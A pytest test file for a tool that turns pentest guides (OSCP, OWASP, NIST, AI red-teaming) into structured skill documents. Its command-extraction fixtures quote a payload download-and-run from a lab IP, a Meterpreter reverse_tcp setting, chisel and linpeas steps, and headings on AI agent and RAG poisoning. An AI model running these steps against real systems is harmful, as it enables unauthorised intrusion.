import json
import sys
from pathlib import Path


ROOT_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT_DIR / "tools"))

from evaluate_redteam_skill import evaluate
from generate_redteam_skill import build_context, build_chunks, extract_commands, extract_known_concepts, generate, load_profile_yaml, sanitize_command


def test_generate_and_evaluate_redteam_skill(tmp_path):
    full_text = tmp_path / "full_text.txt"
    metadata = tmp_path / "metadata.json"
    out_dir = tmp_path / "outputs" / "lab-skill"
    profile_dir = ROOT_DIR / "profiles" / "redteam"

    full_text.write_text(
        "\n".join(
            [
                "SOURCE: lab-guide.md (Path: /tmp/lab-guide.md)",
                "# Authorized Lab Reconnaissance",
                "Use this material only in an approved training range.",
                "Information Gathering",
                "Rules of Engagement",
                "```bash",
                "nmap -sV 192.0.2.10",
                "```",
                "Final Report",
                "Record evidence, impact, remediation, and report notes.",
                "If scanning fails with timeout, verify access and scope.",
            ]
        ),
        encoding="utf-8",
    )
    metadata.write_text(
        json.dumps(
            {
                "filename": "lab-guide.md",
                "format": "pdf",
                "extraction_method": "docling",
                "extraction_mode": "technical",
                "sources": [
                    {
                        "filename": "lab-guide.md",
                        "format": "pdf",
                        "extraction_method": "docling",
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    written = generate(full_text, metadata, profile_dir, out_dir)

    assert {
        "SKILL.md",
        "chapters",
        "information-gathering.md",
        "rules-of-engagement.md",
        "glossary.md",
        "patterns.md",
        "cheatsheet.md",
        "checklist.md",
        "commands.md",
        "workflows.md",
        "troubleshooting.md",
        "reporting.md",
        "safety.md",
        "references.md",
        "coverage.json",
        "citations.json",
    }.issubset({path.name for path in written})

    commands = (out_dir / "commands.md").read_text(encoding="utf-8")
    assert "Context of use:" in commands
    assert "Safety note:" in commands
    assert (out_dir / "chapters" / "information-gathering.md").exists()
    assert (out_dir / "coverage.json").exists()
    assert (out_dir / "citations.json").exists()

    ok, messages = evaluate(out_dir, profile_dir, source_path=full_text, metadata_path=metadata)
    assert ok, "\n".join(messages)


def test_redteam_generation_requires_docling_for_pdf_metadata(tmp_path):
    full_text = tmp_path / "full_text.txt"
    metadata = tmp_path / "metadata.json"
    out_dir = tmp_path / "outputs" / "bad-extraction"
    profile_dir = ROOT_DIR / "profiles" / "redteam"

    full_text.write_text("Information Gathering\nUse only in authorized scope.", encoding="utf-8")
    metadata.write_text(
        json.dumps(
            {
                "filename": "guide.pdf",
                "format": "pdf",
                "extraction_method": "pdftotext",
                "sources": [
                    {
                        "filename": "guide.pdf",
                        "format": "pdf",
                        "extraction_method": "pdftotext",
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    try:
        generate(full_text, metadata, profile_dir, out_dir)
    except RuntimeError as exc:
        assert "requires Docling extraction" in str(exc)
    else:
        raise AssertionError("Expected non-Docling PDF metadata to fail")


def test_redteam_evaluator_fails_non_docling_pdf_metadata(tmp_path):
    full_text = tmp_path / "full_text.txt"
    bad_metadata = tmp_path / "bad_metadata.json"
    docling_metadata = tmp_path / "docling_metadata.json"
    out_dir = tmp_path / "outputs" / "synthetic-skill"
    profile_dir = ROOT_DIR / "profiles" / "redteam"

    full_text.write_text(
        "\n".join(
            [
                "Information Gathering",
                "Rules of Engagement",
                "Use this only with written authorization.",
            ]
        ),
        encoding="utf-8",
    )
    docling_metadata.write_text(
        json.dumps(
            {
                "filename": "guide.pdf",
                "format": "pdf",
                "extraction_method": "docling",
                "sources": [
                    {
                        "filename": "guide.pdf",
                        "format": "pdf",
                        "extraction_method": "docling",
                    }
                ],
            }
        ),
        encoding="utf-8",
    )
    bad_metadata.write_text(
        json.dumps(
            {
                "filename": "guide.pdf",
                "format": "pdf",
                "extraction_method": "pdftotext",
                "sources": [
                    {
                        "filename": "guide.pdf",
                        "format": "pdf",
                        "extraction_method": "pdftotext",
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    generate(full_text, docling_metadata, profile_dir, out_dir)
    ok, messages = evaluate(out_dir, profile_dir, source_path=full_text, metadata_path=bad_metadata)

    assert not ok
    assert any("non-Docling PDF extraction" in message for message in messages)


def test_redteam_quality_extracts_known_owasp_and_nist_concepts():
    text = "\n".join(
        [
            "Information Gathering",
            "Authentication Testing",
            "Input Validation Testing",
            "Information Security Assessment Methodology",
            "Rules of Engagement",
            "Security Assessment Planning",
            "Post-Testing Activities",
            "Final Report",
        ]
    )

    concepts = extract_known_concepts(text)

    assert "Information Gathering" in concepts
    assert "Authentication Testing" in concepts
    assert "Input Validation Testing" in concepts
    assert "Information Security Assessment Methodology" in concepts
    assert "Rules of Engagement" in concepts
    assert "Security Assessment Planning" in concepts
    assert "Post-Testing Activities" in concepts
    assert "Final Report" in concepts


def test_redteam_command_extraction_rejects_pdf_output_pollution():
    text = "\n".join(
        [
            "Consider the following response:",
            "nc sunone.example.com 80                                               Server: Netscape-Enterprise/4.1",
            "curl -kis http://example.com/restricted/",
            "algorithms. Common interpretation, partially based on previous versions.",
            "nmap --script ssl-cert,ssl-enum-ciphers -p                    993/tcp open imaps",
            "openssl s_client -connect www2.example.com:443",
            "verify return:0",
        ]
    )

    commands = [item["command"] for item in extract_commands(text)]

    assert "nc sunone.example.com 80" in commands
    assert "curl -kis http://example.com/restricted/" in commands
    assert "openssl s_client -connect www2.example.com:443" in commands
    assert all("Server:" not in command for command in commands)
    assert all("993/tcp open imaps" not in command for command in commands)


def test_redteam_section_selection_prefers_body_over_toc():
    text = "\n".join(
        [
            "# Contents",
            "| Authentication Testing |",
            "| Testing for Credentials Transported over an Encrypted Channel |",
            "| Testing for default credentials |",
            "",
            "# Introduction",
            "This guide has a table of contents before the real body.",
            "",
            "## Authentication Testing",
            "Authentication testing validates credential handling and identity proofing.",
            "How to Test",
            "Review login transport, default credentials, lockout policy, password reset, and cache behavior.",
            "Expected result",
            "The tester records evidence and remediation notes for each authentication weakness.",
            "",
            "## Authorization Testing",
            "Authorization testing validates access boundaries.",
        ]
    )

    chunks = {chunk["key"]: chunk for chunk in build_chunks(text)}

    assert chunks["authentication-testing"]["start_line"] == 9
    assert chunks["authentication-testing"]["confidence"] == "primary_section"
    assert any("credential handling" in line for line in chunks["authentication-testing"]["excerpt"])


def test_redteam_testing_for_heading_keeps_subtest_body():
    text = "\n".join(
        [
            "| Information Gathering |",
            "| OTG-INFO-001 | Conduct Search Engine Discovery and Reconnaissance for Information Leakage |",
            "",
            "## Testing for Information Gathering",
            "",
            "## Conduct search engine discovery/reconnaissance for information leakage (OTG-INFO-001)",
            "Search engines can reveal indexed files, metadata, and accidental information leakage.",
            "How to Test",
            "Use search operators to identify cached pages, exposed files, and references to the target.",
            "",
            "## Fingerprint Web Server (OTG-INFO-002)",
            "Fingerprinting identifies the web server type and version from observable responses.",
        ]
    )

    chunks = {chunk["key"]: chunk for chunk in build_chunks(text)}

    assert chunks["information-gathering"]["start_line"] == 4
    assert chunks["information-gathering"]["confidence"] == "primary_section"
    assert any("Search engines can reveal" in line for line in chunks["information-gathering"]["excerpt"])


def test_redteam_command_cleanup_handles_docling_artifacts():
    text = "\n".join(
        [
            "The following example shows how to identify the name servers:",
            "host -t ns www.owasp.org www.owasp.org is an alias for owasp.org. owasp.org name server ns1.secure.net.",
            "How to Test",
            "curl -s -D- https:/ /domain.com/ | grep Strict",
            "Then the tester can target local proxy tools:",
            "openssl s\\_client -connect localhost:9999",
        ]
    )

    commands = [item["command"] for item in extract_commands(text)]

    assert "host -t ns www.owasp.org" in commands
    assert "curl -s -D- https://domain.com/ | grep Strict" in commands
    assert "openssl s_client -connect localhost:9999" in commands
    assert all("is an alias" not in command for command in commands)


def test_redteam_command_cleanup_strips_book_listing_suffix():
    assert sanitize_command("./linpeas.sh Listing 883 - Starting the local enumeration with linpeas") == "./linpeas.sh"
    assert sanitize_command("nmap -sV 192.0.2.10 Figure 12 - Service scan") == "nmap -sV 192.0.2.10"
    assert sanitize_command("host www.megacorpone.com www.megacorpone.com") == "host www.megacorpone.com"
    assert sanitize_command("host idontexist.megacorpone.com Host idontexist.megacorpone.com") == "host idontexist.megacorpone.com"
    assert sanitize_command("python3 smtp.py root 192.168.50.8 b'220 mail ESMTP Postfix'") is None


def test_redteam_command_extraction_handles_docling_prompts_and_output():
    text = "\n".join(
        [
            "Use the following commands in an authorized lab.",
            "kali@kali:~$ sudo iptables -Z kali@kali:~$ nmap -p 1-65535 192.168.50.149 Starting Nmap 7.92 at 2022-03-09",
            "PS C:\\Users\\marcus> iwr -uri http://192.168.119.5:8000/met.exe -Outfile met.exe PS C:\\Users\\marcus> .\\met.exe",
            "msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp payload => windows/x64/meterpreter/reverse_tcp",
            "meterpreter > upload chisel.exe C:\\\\Users\\\\marcus\\\\chisel.exe [*] Uploading  : /home/kali/beyond/chisel.exe",
        ]
    )

    commands = [item["command"] for item in extract_commands(text)]

    assert "sudo iptables -Z" in commands
    assert "nmap -p 1-65535 192.168.50.149" in commands
    assert "iwr -uri http://192.168.119.5:8000/met.exe -Outfile met.exe" in commands
    assert ".\\met.exe" in commands
    assert "set payload windows/x64/meterpreter/reverse_tcp" in commands
    assert "upload chisel.exe C:\\\\Users\\\\marcus\\\\chisel.exe" in commands
    assert all("Starting Nmap" not in command for command in commands)
    assert all("Uploading" not in command for command in commands)


def test_redteam_command_extraction_joins_multiline_curl():
    text = "\n".join(
        [
            "offsec@kali:~$ curl -s http://10.10.50.15:9005/invoke -X POST \\",
            '  -H "Content-Type: application/json" \\',
            "  -d '{\"tool\": \"vault_rotate_secret\",",
            '       "params": {"secret_path": "secret/nexus/test_canary"}}\'',
            "Listing 101 - Invoking an MCP tool",
        ]
    )

    commands = [item["command"] for item in extract_commands(text)]

    assert 'curl -s http://10.10.50.15:9005/invoke -X POST -H "Content-Type: application/json" -d \'{"tool": "vault_rotate_secret", "params": {"secret_path": "secret/nexus/test_canary"}}\'' in commands


def test_redteam_command_context_prefers_listing_caption():
    text = "\n".join(
        [
            "The next listing demonstrates a scan.",
            "kali@kali:~$ nmap -sS 192.168.50.149 Starting Nmap 7.92",
            "Nmap scan report for 192.168.50.149",
            "<!-- image -->",
            "Listing 58 - Using nmap to perform a SYN scan",
        ]
    )

    commands = extract_commands(text)

    assert commands[0]["command"] == "nmap -sS 192.168.50.149"
    assert commands[0]["context"] == "Using nmap to perform a SYN scan"


def test_redteam_classic_profile_does_not_promote_routing_scope_as_roe(tmp_path):
    profile_dir = ROOT_DIR / "profiles" / "redteam"
    schema = load_profile_yaml(profile_dir / "schema.yaml")
    text = "\n".join(
        [
            "SOURCE: PEN200 - OSCP - 2023 version_1.pdf",
            "# PEN200",
            "## 6 Information Gathering",
            "Information gathering identifies reachable hosts, services, and exposed network details.",
            "The tester records command output and evidence for later analysis.",
            "## 172.16.50.0/24 dev ens224 proto kernel scope link src 172.16.50.217 metric 100",
            "The routing table confirms that the lab host has a local path to the target subnet.",
            "Use this observation only in an authorized training environment.",
        ]
    )
    metadata = {
        "filename": "PEN200 - OSCP - 2023 version_1.pdf",
        "format": "pdf",
        "extraction_method": "docling",
    }

    context = build_context(text, metadata, profile_dir, tmp_path, schema)
    chunk_keys = {chunk["key"] for chunk in context["chunks"]}

    assert context["document_profile"] == "classic_pentest"
    assert "information-gathering" in chunk_keys
    assert "rules-of-engagement" not in chunk_keys


def test_redteam_classic_profile_promotes_pentest_specific_taxonomy(tmp_path):
    profile_dir = ROOT_DIR / "profiles" / "redteam"
    schema = load_profile_yaml(profile_dir / "schema.yaml")
    text = "\n".join(
        [
            "SOURCE: PEN200 - OSCP - 2023 version_1.pdf",
            "# Penetration Testing with Kali Linux",
            "## 6.3.3 Port Scanning with Nmap",
            "Port scanning identifies reachable TCP and UDP services on in-scope hosts.",
            "The tester records open ports, service banners, and scan limitations as evidence.",
            "## 7 Vulnerability Scanning",
            "Vulnerability scanning uses tools such as Nessus or Nmap to identify candidate weaknesses.",
            "The tester validates scanner output before including findings in a report.",
            "## 16 Windows Privilege Escalation",
            "Windows privilege escalation requires enumeration of privileges, services, and access control.",
            "Evidence should include command output and the exact misconfiguration path.",
            "## 17 Linux Privilege Escalation",
            "Linux privilege escalation reviews users, files, services, and kernel exposure.",
            "The tester keeps changes controlled and records all local enumeration evidence.",
            "## 18 Port Redirection and SSH Tunneling",
            "Port forwarding and SSH tunneling expose internal services through an approved route.",
            "The tester records local and remote endpoints and confirms scope before forwarding traffic.",
            "## 21 Active Directory Introduction and Enumeration",
            "Active Directory enumeration maps domain users, groups, computers, and permissions.",
            "PowerShell and PowerView output should be captured as evidence.",
            "## 22 Attacking Active Directory Authentication",
            "Active Directory authentication attacks target password material and Kerberos workflows.",
            "The tester documents credentials, tickets, and authorization boundaries.",
        ]
    )
    metadata = {
        "filename": "PEN200 - OSCP - 2023 version_1.pdf",
        "format": "pdf",
        "extraction_method": "docling",
    }

    context = build_context(text, metadata, profile_dir, tmp_path, schema)
    chunk_keys = {chunk["key"] for chunk in context["chunks"]}

    assert context["document_profile"] == "classic_pentest"
    assert "network-port-scanning" in chunk_keys
    assert "vulnerability-scanning" in chunk_keys
    assert "windows-privilege-escalation" in chunk_keys
    assert "linux-privilege-escalation" in chunk_keys
    assert "port-redirection-and-tunneling" in chunk_keys
    assert "active-directory-enumeration" in chunk_keys
    assert "active-directory-attacks" in chunk_keys


def test_redteam_nist_profile_does_not_promote_web_weak_mentions(tmp_path):
    profile_dir = ROOT_DIR / "profiles" / "redteam"
    schema = load_profile_yaml(profile_dir / "schema.yaml")
    text = "\n".join(
        [
            "SOURCE: nistspecialpublication800-115.pdf",
            "# Technical Guide to Information Security Testing and Assessment",
            "Vulnerability scanners with administrator-level credentials may find local vulnerabilities.",
            "## 6. Security Assessment Planning",
            "Proper planning is critical to a successful security assessment.",
            "Organizations should define scope, schedule, logistics, legal considerations, and assessment policy.",
            "Assessment plans should identify authorized systems and networks.",
            "## 7. Security Assessment Execution",
            "During execution vulnerabilities are identified by the methods in the plan or rules of engagement.",
        ]
    )
    metadata = {"filename": "nistspecialpublication800-115.pdf", "format": "pdf", "extraction_method": "docling"}

    context = build_context(text, metadata, profile_dir, tmp_path, schema)
    chunk_keys = {chunk["key"] for chunk in context["chunks"]}
    weak_keys = {item["key"] for item in context["weak_references"]}

    assert context["document_profile"] == "nist_methodology"
    assert "security-assessment-planning" in chunk_keys
    assert "authentication-testing" not in chunk_keys
    assert "authentication-testing" not in weak_keys


def test_redteam_owasp_profile_keeps_api_cookie_match_as_out_of_scope(tmp_path):
    profile_dir = ROOT_DIR / "profiles" / "redteam"
    schema = load_profile_yaml(profile_dir / "schema.yaml")
    text = "\n".join(
        [
            "SOURCE: OWASP_Testing_Guide_v4.pdf",
            "# OWASP Web Security Testing Guide",
            "## Testing for Information Gathering",
            "Search engines can reveal indexed files and accidental information leakage.",
            "How to Test",
            "Use search operators to identify cached pages, exposed files, and references to the target.",
            "Now that the tester has enumerated the cookies and has a general idea of their use, it is time to review interesting cookies.",
            "A cookie must resist malicious attempts of modification and should have expiration properties.",
        ]
    )
    metadata = {"filename": "OWASP_Testing_Guide_v4.pdf", "format": "pdf", "extraction_method": "docling"}

    context = build_context(text, metadata, profile_dir, tmp_path, schema)
    chunk_keys = {chunk["key"] for chunk in context["chunks"]}
    weak_keys = {item["key"] for item in context["weak_references"]}
    taxonomy_keys = {item["key"] for item in context["taxonomy"]}

    assert context["document_profile"] == "owasp_web"
    assert "information-gathering" in chunk_keys
    assert "api-pentest" not in taxonomy_keys
    assert "api-pentest" not in chunk_keys
    assert "api-pentest" not in weak_keys


def test_redteam_ai_profile_promotes_ai_specific_concepts(tmp_path):
    profile_dir = ROOT_DIR / "profiles" / "redteam"
    schema = load_profile_yaml(profile_dir / "schema.yaml")
    text = "\n".join(
        [
            "SOURCE: AI-300-Ch1.html",
            "# OffSec Advanced AI Red Teaming",
            "This course targets AI-integrated environments and AI-enabled enterprise systems.",
            "## Attacking AI Agents",
            "AI agents call tools through an orchestrator and maintain memory that can influence later actions.",
            "Agent token handling, tool authorization, and memory poisoning are core red team concerns.",
            "Evidence should include agent decisions, tool calls, token scope, and downstream impact.",
            "## Exploiting RAG Pipelines",
            "RAG pipelines combine retrieval, vector databases, and knowledge bases.",
            "A red team assessment checks retrieval hijacking, poisoning, and context manipulation.",
            "Evidence should include retrieved documents, vector database behavior, and model output changes.",
            "## Attacking MCP and Tool Surfaces",
            "MCP servers expose tools through JSON-RPC style tool invocation surfaces.",
            "Tool schemas, Vault access, and per-agent tool scoping must be reviewed.",
            "Evidence should include MCP tool calls, parameters, audit logs, and authorization boundaries.",
        ]
    )
    metadata = {"filename": "AI-300-Ch1.html", "format": "html", "extraction_method": "html-parser"}

    context = build_context(text, metadata, profile_dir, tmp_path, schema)
    chunk_keys = {chunk["key"] for chunk in context["chunks"]}

    assert context["document_profile"] == "ai_redteam"
    assert "ai-agent-attacks" in chunk_keys
    assert "rag-pipeline-exploitation" in chunk_keys
    assert "mcp-tool-surface-attacks" in chunk_keys
    assert "authentication-testing" not in chunk_keys
